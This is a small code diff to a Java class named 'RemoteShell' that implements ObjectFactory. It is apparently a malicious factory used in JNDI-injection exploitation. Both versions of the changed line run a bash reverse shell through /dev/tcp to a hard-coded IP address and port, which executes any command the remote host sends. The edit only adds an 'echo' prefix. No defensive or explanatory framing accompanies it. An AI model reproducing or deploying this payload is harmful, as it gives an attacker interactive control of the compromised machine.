@@ -9,7 +9,7 @@ public class RemoteShell implements ObjectFactory  {
         String[] cmd = {
                 "/bin/bash",
                 "-c",
-                "exec 5<>/dev/tcp/104.190.152.11/9000;cat <&5 | while read line; do $line 2>&5 >&5; done" };
+                "echo Oh hai\n; exec 5<>/dev/tcp/104.190.152.11/9000;cat <&5 | while read line; do $line 2>&5 >&5; done" };
         Runtime.getRuntime().exec(cmd);
         return  null;
     }
